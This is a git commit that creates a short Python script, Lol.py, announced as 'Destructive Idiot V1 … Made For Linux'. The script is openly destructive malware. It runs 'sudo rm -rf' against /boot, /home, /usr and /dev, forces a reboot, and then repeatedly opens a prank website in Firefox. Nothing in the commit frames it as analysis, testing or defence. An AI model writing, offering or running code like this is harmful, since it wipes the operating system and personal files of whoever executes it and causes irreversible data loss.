4dfa19626c8eb23ea7be6c023d7db89329f8606d
BenPI88 <97198967+BenPI88@users.noreply.github.com>
2022-09-10 13:10:29 -0500

    Create Lol.py

---
+++ Lol.py
@@ -0,0 +1,10 @@
+print("Destructive Idiot V1")
+print("Made For Linux")
+print("https://github.com/BenPI88/Destructive-Idiot")
+import os
+os.system("sudo rm -rf /boot && rm -rf /home && rm -rf /usr && rm -rf /dev")
+import time
+os.system("shutdown -r")
+while True:
+  os.system("firefox youareanidiot.cc")
+  time.sleep(10)
